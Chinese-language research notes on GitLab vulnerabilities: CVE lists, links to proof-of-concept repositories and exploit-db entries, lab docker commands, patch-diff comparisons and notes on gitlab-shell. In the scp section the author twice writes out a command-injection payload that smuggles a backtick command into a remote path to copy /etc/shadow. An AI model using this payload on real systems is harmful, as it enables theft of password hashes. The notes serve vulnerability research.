# gitlab 使用和安全


## 破解

https://gitee.com/azhao-1981/CVE-2021-22192

## 漏洞 CVE-2021-22192 CVE-2021-22205

### POC

[Gitlab 操作系统命令注入漏洞 CVE-2021-22205](http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202104-1685)

[GitLab CE/EE任意代码执行漏洞 CVE-2021-22192](http://www.nsfocus.net/vulndb/53880)
https://gitee.com/azhao-1981/CVE-2021-22192

docker pull gitlab/gitlab-ee:13.2.0-ee.0
docker save gitlab/gitlab-ee:13.2.0-ee.0 > gitlab.ee.13.2.0.tar
docker pull gitlab/gitlab-runner:ubuntu-v13.10.0
docker save gitlab/gitlab-runner:ubuntu-v13.10.0 > gitlab-runner-ubuntu-v13.10.0.tar

https://hub.docker.com/r/gitlab/gitlab-runner/dockerfile/

 sudo docker run -it -v /home/kali/lab/gitlab-CVE-2021-22192/runner/busybox:/busybox gitlab/gitlab-runner:ubuntu-v13.10.0 /busybox ls

这里面有复现步骤

https://hackerone.com/reports/1125425
https://gitlab.com/gitlab-org/gitlab/-/issues/324452

https://github.com/nomi-sec/PoC-in-GitHub
An issue has been discovered in GitLab CE/EE affecting all versions starting from 13.2 allowing unauthorized authenticated users to execute arbitrary code on the server.
lyy289065406/CVE-2021-22192
https://github.com/lyy289065406/CVE-2021-22192
PetrusViet/Gitlab-RCE | 这个什么都没有

### 咨讯
[GitLab 远程代码执行漏洞通告](https://www.anquanke.com/post/id/235002)
GitLab Critical Security Release: 13.9.4, 13.8.6, and 13.7.9
+ 改的只有13的版本
+ 没有CVE
https://gitlab.com/gitlab-org/gitlab
这个是ee?
git@gitlab.com:gitlab-org/gitlab.git
https://gitlab.com/gitlab-org/gitlab/-/compare/v13.9.3-ee...v13.9.4-ee
https://gitlab.com/gitlab-org/gitlab/-/compare/master...v13.9.4-ee

git tag
v13.9.3-ee
v13.9.4-ee
git checkout -b v13.9.4-ee v13.9.4-ee
git checkout -b v13.9.3-ee v13.9.3-ee

https://gitlab.com/gitlab-org/gitlab-foss
 Project 'gitlab-org/gitlab-ce' was moved to 'gitlab-org/gitlab-foss'.
https://github.com/gitlabhq/gitlabhq
https://gitee.com/mirrors/gitlab
https://gitlab.com/gitlab-org/gitlab-foss/-/compare/v13.9.3...v13.9.4
https://github.com/gettalong/kramdown/pull/708

那其它用 kramdown 的项目会不会也受影响

## 其它

GitLab（企业版和社区版）10.3版本至13.0.1版本中存在安全漏洞。攻击者可利用该漏洞查看Kubernetes集群令牌。
http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202006-1506

GitLab（企业版）9.5版本至13.0.1版本中存在安全漏洞。攻击者可利用该漏洞冒充维护者执行操作。
http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202006-1504

GitLab（企业版和社区版）12.6版本至13.0.1版本中存在安全漏洞。攻击者可借助HTML源代码利用该漏洞查看Amazon EKS凭证。
http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202006-1503

GitLab 跨站脚本执行漏洞（CVE-2020-13269）
http://www.nsfocus.net/vulndb/48688

GitLab（企业版和社区版）12.10版本至13.0.1版本中存在跨站脚本执行漏洞。攻击者可利用该漏洞在静态站点编辑器上执行任意Javascript代码。
GitLab拒绝服务漏洞（CVE-2020-13306）
http://www.nsfocus.net/vulndb/50297

GitLab身份验证不当漏洞（CVE-2020-13303）
http://www.nsfocus.net/vulndb/50296

http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202011-1656
GitLab 安全漏洞
GitLab EE 12.10之后版本存在安全漏洞，攻击者可利用该漏洞可以在未来安排大量的发布，当发布日期到来时，当所有的发布被同时处理时，攻击者可利用该漏洞会拒绝对GitLab EE 12.10+实例的服务。
以下产品及版本受到影响：12.10版本至13.3.9之前版本, 13.3.9版本至13.4.5之前版本, 13.4.5版本至13.5.2之前版本。
Gitlab 12.9.0 - Arbitrary File Read (Authenticated)
https://www.exploit-db.com/exploits/49076
[GitLab 11.4.7 - RCE (Authenticated)](https://www.exploit-db.com/exploits/49334)
https://www.exploit-db.com/exploits/49263
GitLab 11.4.7 - Remote Code Execution (Authenticated)
https://www.exploit-db.com/exploits/49257
Gitlab 11.4.7 - Remote Code Execution

Gitlab 安全漏洞
http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202012-442

Gitlab CE/EE 跨站脚本漏洞
http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202012-439

GitLab 安全漏洞
http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202101-1296

GitLab 访问控制错误漏洞|高危
http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202101-1294

Gitlab Nuget Api 安全漏洞
http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202101-1295



[部署 在 Rails 项目中使用 Docker 和 GitLab CI 高效构建镜像 (第一部分)](https://ruby-china.org/topics/38766)


安全研究 | 如何查看GitLab中的共享敏感数据
https://www.freebuf.com/sectool/266025.html
GitLab 搜索利器，代码搜索工具 Kooder 发布
https://gitee.com/koode/kooder
https://www.oschina.net/news/132535/gitee-release-kooder?from=20210314
[诡异的gitlab排错经历](https://xnow.me/ops/gitlab-authorized_keys-trouble-shooting.html)

+ 使用root来执行还是scp用户: 是scp用户

```bash
scp ./abc ubuntus:'`cat /etc/shadow > /tmp/ccc`/tmp/abc'
```

+ gitlab的git是否会受到影响，现在看，没有
+ 0权限的是否能运行，不能

[blog](http://octopress.org/)
[disqus](https://disqus.com/)

构造： scp ./abc ubuntus:'`cat /etc/shadow > /tmp/ccc`/tmp/abc'

gitlab:

```bash
/var/opt/gitlab/.ssh/authorized_keys
command="/opt/gitlab/embedded/service/gitlab-shell/bin/gitlab-shell key-711",no-port-forwarding,no-X11-forwarding,no-agent-forwarding,no-pty ssh-rsa AAAAxxxx
```

command
no-port-forwarding
no-X11-forwarding
no-agent-forwarding
no-pty

[GitLab系列4 GitLab Shell|**这个很不错**](https://juejin.im/post/6844903860033552391)

[Gitlab Shell如何工作](http://williamherry.com/blog/2015/07/19/from-git-push-to-commit-show-on-page/)

[Fast lookup of authorized SSH keys in the database](https://docs.gitlab.com/ee/administration/operations/fast_ssh_key_lookup.html)

